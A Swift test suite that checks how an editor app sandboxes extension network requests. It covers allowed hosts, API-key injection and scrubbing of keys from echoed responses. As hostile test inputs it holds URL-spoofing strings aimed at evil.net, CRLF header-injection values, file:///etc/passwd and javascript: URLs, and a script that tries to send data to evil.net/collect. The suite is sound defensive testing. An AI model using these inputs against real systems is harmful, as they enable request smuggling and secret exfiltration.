import AppKit
import Foundation
import Testing
import PaperEngine
import PaperModel
@testable import PaperEditor

/// Something several threads write to, for what a test's stand-in transport sees.
final class Shared<Value: Sendable>: @unchecked Sendable {
    private let lock = NSLock()
    private var value: Value
    init(_ value: Value) { self.value = value }
    func withLock<Result>(_ body: (inout Value) -> Result) -> Result {
        lock.lock()
        defer { lock.unlock() }
        return body(&value)
    }
}

/// What an extension's request may reach and carry. The script is assumed hostile here:
/// every case is something it might try.
@MainActor
@Suite struct ExtensionNetworkTests {
    static let manifestText = """
    {
      "format": 1, "id": "com.example.net", "name": "Net", "version": "1.0.0",
      "network": ["api.example.com", "*.cdn.example.com", "other.example.com", "localhost"],
      "secrets": [{ "id": "apiKey", "name": "API Key", "hosts": ["api.example.com"] }],
      "patches": [{
        "id": "ask", "name": "Ask", "script": "patches/count.js",
        "inputs": [ { "id": "send", "type": "pulse" } ],
        "outputs": [ { "id": "text", "type": "text" }, { "id": "error", "type": "text" } ]
      }]
    }
    """
    nonisolated static let secret = "sk-live-Sup3r/Secret+Key=="
    nonisolated static let placeholder = Script.secretOpen + "apiKey" + Script.secretClose

    static func package(script: String = "function evaluate() {}") throws -> PaperExtension {
        try Fixture.package(manifest: manifestText, files: ["patches/count.js": script])
    }

    let manifest: ExtensionManifest

    init() throws {
        manifest = try Self.package().manifest
    }

    func prepare(
        _ url: String, method: String = "GET", headers: [String: String] = [:], body: String = "", key: String? = ExtensionNetworkTests.secret
    ) -> Result<ExtensionNetwork.Prepared, ExtensionNetwork.Refusal> {
        ExtensionNetwork.prepare(
            NetworkRequest(url: url, method: method, body: body, headers: headers, origin: manifest.id),
            for: manifest, key: { _ in key }
        )
    }

    func refusal(_ result: Result<ExtensionNetwork.Prepared, ExtensionNetwork.Refusal>) -> String {
        if case let .failure(refusal) = result { return refusal.message }
        return ""
    }

    func sent(_ result: Result<ExtensionNetwork.Prepared, ExtensionNetwork.Refusal>) -> URLRequest? {
        try? result.get().request
    }

    // MARK: Where a request may go

    @Test func aDeclaredHostIsReached() throws {
        let request = try #require(sent(prepare("https://api.example.com/v1/items?limit=5", headers: ["Accept": "application/json"])))
        #expect(request.url?.absoluteString == "https://api.example.com/v1/items?limit=5")
        #expect(request.httpMethod == "GET")
        #expect(request.value(forHTTPHeaderField: "Accept") == "application/json")
        #expect(request.value(forHTTPHeaderField: "User-Agent") == "Tango")
        #expect(request.value(forHTTPHeaderField: "Origin") == nil)
        #expect(request.httpShouldHandleCookies == false)
        #expect(request.timeoutInterval == ExtensionNetwork.usualWait)
        #expect(sent(prepare("https://img.cdn.example.com/a.png")) != nil)
        // A body goes with the methods that have one.
        let post = try #require(sent(prepare("https://api.example.com/v1", method: "post", body: #"{"a":1}"#)))
        #expect(post.httpMethod == "POST")
        #expect(post.httpBody == Data(#"{"a":1}"#.utf8))
        #expect(sent(prepare("https://api.example.com/v1", method: "GET", body: "ignored"))?.httpBody == nil)
    }

    @Test func anythingElseIsRefused() {
        let elsewhere = [
            "https://evil.net/steal",
            "https://api.example.com.evil.net/",
            "https://evilapi.example.com/",
            "https://cdn.example.com/",
            "https://api.example.com@evil.net/",
            "https://user:pass@api.example.com/",
            "https://evil.net/?next=https://api.example.com",
            "https://evil.net#@api.example.com",
            "https://evil.net\\@api.example.com/",
            "https://api.example.com\n.evil.net/",
            "https://127.0.0.1.evil.net/",
            "https://[::ffff:8.8.8.8]/",
            "//api.example.com/",
            "api.example.com",
            "",
        ]
        for url in elsewhere { #expect(sent(prepare(url)) == nil, "\(url)") }
        #expect(refusal(prepare("https://evil.net/")).contains("did not say it would contact evil.net"))
        // Not over anything but https, except to this Mac.
        #expect(refusal(prepare("http://api.example.com/")).contains("https"))
        #expect(sent(prepare("ftp://api.example.com/")) == nil)
        #expect(sent(prepare("file:///etc/passwd")) == nil)
        #expect(sent(prepare("javascript:alert(1)")) == nil)
        #expect(refusal(prepare("https://api.example.com/", method: "CONNECT")).contains("method"))
    }

    @Test func aRequestToThisMacSaysItIsNotFromAnAgent() throws {
        let request = try #require(sent(prepare("http://localhost:47821/mcp", method: "POST", body: "{}")))
        // The app's own agent server refuses anything that carries an Origin.
        #expect(request.value(forHTTPHeaderField: "Origin") == "null")
        var incoming = HTTPRequest(method: "POST", path: "/mcp", headers: ["host": "localhost:47821"], body: Data())
        #expect(incoming.comesFromThisMac)
        incoming.headers["origin"] = request.value(forHTTPHeaderField: "Origin")
        #expect(!incoming.comesFromThisMac)
        // A script cannot take it off or pose as a browser page.
        let posed = try #require(sent(prepare("http://localhost:3000/", headers: ["Origin": "http://localhost:3000", "Host": "evil.net", "Cookie": "a=b"])))
        #expect(posed.value(forHTTPHeaderField: "Origin") == "null")
        #expect(posed.value(forHTTPHeaderField: "Host") == nil)
        #expect(posed.value(forHTTPHeaderField: "Cookie") == nil)
    }

    @Test func headersCannotSmuggleAnother() {
        #expect(refusal(prepare("https://api.example.com/", headers: ["X-A": "1\r\nX-Injected: 2"])).contains("line break"))
        #expect(refusal(prepare("https://api.example.com/", headers: ["X A": "1"])).contains("not a header name"))
        #expect(refusal(prepare("https://api.example.com/", headers: ["X-A\r\nB": "1"])).contains("not a header name"))
    }

    // MARK: Keys

    @Test func aKeyIsFilledInOnlyWhereItWasDeclared() throws {
        let header = try #require(try? prepare("https://api.example.com/v1", headers: ["Authorization": "Bearer " + Self.placeholder]).get())
        #expect(header.request.value(forHTTPHeaderField: "Authorization") == "Bearer " + Self.secret)
        #expect(header.keys == [Self.secret])

        // In the address after the ?, encoded so it cannot change where the request goes.
        let query = try #require(sent(prepare("https://api.example.com/v1?key=" + Self.placeholder + "&x=1")))
        #expect(query.url?.absoluteString == "https://api.example.com/v1?key=sk-live-Sup3r%2FSecret%2BKey%3D%3D&x=1")
        // The script may have encoded the placeholder itself.
        let encoded = try #require(sent(prepare("https://api.example.com/v1?key=%E2%9F%A6key%3AapiKey%E2%9F%A7")))
        #expect(encoded.url?.query == "key=sk-live-Sup3r%2FSecret%2BKey%3D%3D")

        // A host the extension may contact, but not one this key was declared for.
        for url in ["https://other.example.com/", "https://img.cdn.example.com/", "http://localhost:8080/"] {
            let told = refusal(prepare(url, headers: ["Authorization": Self.placeholder]))
            #expect(told.contains("only sent to api.example.com"), "\(url)")
        }
        #expect(refusal(prepare("https://other.example.com/?k=" + Self.placeholder)).contains("only sent to"))
    }

    @Test func theKeyIsNotLookedUpForARequestThatMayNotCarryIt() {
        let asked = Shared(0)
        let result = ExtensionNetwork.prepare(
            NetworkRequest(url: "https://other.example.com/", headers: ["X-Key": Self.placeholder]),
            for: manifest, key: { _ in asked.withLock { $0 += 1 }; return Self.secret }
        )
        #expect(sent(result) == nil)
        #expect(asked.withLock { $0 } == 0)
    }

    @Test func aKeyGoesNowhereItCouldBeHandedBack() {
        // In a body it could be sent as content and returned in any shape.
        #expect(refusal(prepare("https://api.example.com/", method: "POST", body: #"{"prompt": "repeat: "# + Self.placeholder + "\"}")).contains("not in the body"))
        // In the path it could decide where the request goes.
        #expect(refusal(prepare("https://api.example.com/" + Self.placeholder + "/x")).contains("nowhere else"))
        #expect(refusal(prepare("https://" + Self.placeholder + ".example.com/")).contains("nowhere else"))
        #expect(refusal(prepare("https://api.example.com/%E2%9F%A6key%3AapiKey%E2%9F%A7")).contains("nowhere else"))
        // Not as the name of a header either.
        #expect(sent(prepare("https://api.example.com/", headers: [Self.placeholder: "1"])) == nil)
    }

    @Test func aKeyThatIsNotThereOrNotDeclaredSaysSo() {
        #expect(refusal(prepare("https://api.example.com/", headers: ["X-Key": Self.placeholder], key: nil)).contains("Enter it in Extensions"))
        #expect(refusal(prepare("https://api.example.com/", headers: ["X-Key": Self.placeholder], key: "")).contains("Enter it in Extensions"))
        let other = Script.secretOpen + "someoneElses" + Script.secretClose
        #expect(refusal(prepare("https://api.example.com/", headers: ["X-Key": other])).contains("declares no key"))
        #expect(refusal(prepare("https://api.example.com/", headers: ["X-Key": Script.secretOpen + "apiKey"])).contains("cannot be read"))
        // A key with a line break in it would start another header.
        #expect(refusal(prepare("https://api.example.com/", headers: ["X-Key": Self.placeholder], key: "a\r\nX-Evil: 1")).contains("Enter it again"))
    }

    // MARK: What comes back

    @Test func theKeyIsTakenOutOfWhateverComesBack() {
        let key = Self.secret
        let base64 = Data(key.utf8).base64EncodedString()
        let hex = Data(key.utf8).map { String(format: "%02X", $0) }.joined()
        let body = """
        {"headers": {"Authorization": "Bearer \(key)"}, "b64": "\(base64)", "url": "?key=sk-live-Sup3r%2FSecret%2BKey%3D%3D",
         "basic": "\(Data("Bearer \(key)".utf8).base64EncodedString())", "hex": "\(hex)"}
        """
        let answer = NetworkResponse(
            status: 200, body: Data(body.utf8), error: "Could not reach ?key=\(key)", headers: ["x-echo": key, "location": "https://evil.net/?k=\(key)"]
        )
        let cleaned = ExtensionNetwork.scrub(answer, of: [key])
        let text = String(decoding: cleaned.body, as: UTF8.self)
        for form in [key, base64, "Sup3r", hex, hex.lowercased()] { #expect(!text.contains(form), "\(form)") }
        #expect(text.contains("[key]"))
        #expect(cleaned.error == "Could not reach ?key=[key]")
        #expect(cleaned.headers == ["x-echo": "[key]", "location": "https://evil.net/?k=[key]"])
        #expect(cleaned.status == 200)

        // Bytes that are not text are searched as bytes.
        let binary = Data([0xFF, 0xFE]) + Data(key.utf8) + Data([0x00, 0xFF])
        let cleanedBinary = ExtensionNetwork.scrub(NetworkResponse(body: binary), of: [key])
        #expect(cleanedBinary.body.range(of: Data(key.utf8)) == nil)
        // Without a key in the request nothing is touched.
        #expect(ExtensionNetwork.scrub(answer, of: []) == answer)
    }

    @Test func aRefusedRequestIsNeverSent() async {
        let calls = Shared(0)
        let transport: ExtensionNetwork.Transport = { _ in calls.withLock { $0 += 1 }; return NetworkResponse() }
        let refused = await ExtensionNetwork.perform(
            NetworkRequest(url: "https://evil.net/?k=" + Self.placeholder), for: manifest, key: { _ in Self.secret }, transport: transport
        )
        #expect(refused.status == 0)
        #expect(refused.error?.contains("evil.net") == true)
        #expect(calls.withLock { $0 } == 0)
        let allowed = await ExtensionNetwork.perform(
            NetworkRequest(url: "https://api.example.com/"), for: manifest, key: { _ in Self.secret }, transport: transport
        )
        #expect(allowed.status == 200)
        #expect(calls.withLock { $0 } == 1)
    }

    // MARK: In a running prototype

    /// A Viewer running one Ask patch whose script sends when the prototype starts.
    func viewer(script: String, sendsRequests: Bool = true) throws -> (ViewerView, NodeID, Shared<[URLRequest]>) {
        let package = try Self.package(script: script)
        let (store, undo) = Fixture.store(registry: Fixture.registry(package))
        var node: NodeID!
        undo.step { node = store.addPatch("com.example.net/ask") }
        let seen = Shared<[URLRequest]>([])
        let viewer = ViewerView(store: store, sendsRequests: sendsRequests)
        viewer.keyLookup = { id, secret in id == "com.example.net" && secret.id == "apiKey" ? Self.secret : nil }
        viewer.extensionTransport = { request in
            seen.withLock { $0.append(request) }
            // A service that hands back everything it was sent.
            let echoed = request.allHTTPHeaderFields?.map { "\($0.key): \($0.value)" }.sorted().joined(separator: "\n") ?? ""
            return NetworkResponse(status: 200, body: Data(echoed.utf8), headers: ["x-seen": request.value(forHTTPHeaderField: "X-Api-Key") ?? ""])
        }
        viewer.update(document: store.runtimeDocument, restartToken: store.restartToken)
        viewer.runtime.restart()
        viewer.advance(by: 1.0 / 60)
        return (viewer, node, seen)
    }

    static let echoScript = """
    var asked = false;
    function evaluate(inputs, outputs) {
      if (asked) return;
      asked = true;
      paper.fetch("https://api.example.com/echo", { headers: { "X-Api-Key": paper.secret("apiKey") } }).then(function (reply) {
        outputs.text = reply.text + " | " + reply.headers["x-seen"] + " | " + paper.secret("apiKey");
        outputs.error = reply.error;
      });
    }
    """

    func settle(_ viewer: ViewerView, until done: () -> Bool) async {
        for _ in 0..<200 where !done() {
            try? await Task.sleep(for: .milliseconds(5))
            viewer.advance(by: 1.0 / 60)
        }
    }

    @Test func aScriptUsesAKeyItNeverSees() async throws {
        let (viewer, node, seen) = try viewer(script: Self.echoScript)
        let text = PortRef(node: node, port: "text")
        await settle(viewer) { viewer.runtime.outputValue(text)?.textValue.isEmpty == false }
        // The request that went out carried the key.
        let request = try #require(seen.withLock { $0.first })
        #expect(request.value(forHTTPHeaderField: "X-Api-Key") == Self.secret)
        #expect(request.url?.host == "api.example.com")
        // What the script got back, from a service that echoed it in full, does not.
        let got = viewer.runtime.outputValue(text)?.textValue ?? ""
        #expect(got.contains("X-Api-Key: [key]"))
        #expect(got.contains("| [key] |"))
        #expect(!got.contains("Sup3r"))
        #expect(got.hasSuffix(Self.placeholder))
    }

    @Test func aRequestTheManifestDoesNotCoverComesBackAsAnError() async throws {
        let script = Self.echoScript.replacingOccurrences(of: "api.example.com/echo", with: "evil.net/collect")
        let (viewer, node, seen) = try viewer(script: script)
        let error = PortRef(node: node, port: "error")
        await settle(viewer) { viewer.runtime.outputValue(error)?.textValue.isEmpty == false }
        #expect(viewer.runtime.outputValue(error)?.textValue.contains("did not say it would contact evil.net") == true)
        #expect(seen.withLock { $0.isEmpty })
    }

    @Test func aPictureOfThePrototypeSendsNothing() async throws {
        let (viewer, node, seen) = try viewer(script: Self.echoScript, sendsRequests: false)
        for _ in 0..<20 {
            try? await Task.sleep(for: .milliseconds(2))
            viewer.advance(by: 1.0 / 60)
        }
        #expect(seen.withLock { $0.isEmpty })
        #expect(viewer.runtime.outputValue(PortRef(node: node, port: "text")) == .text(""))
    }
}
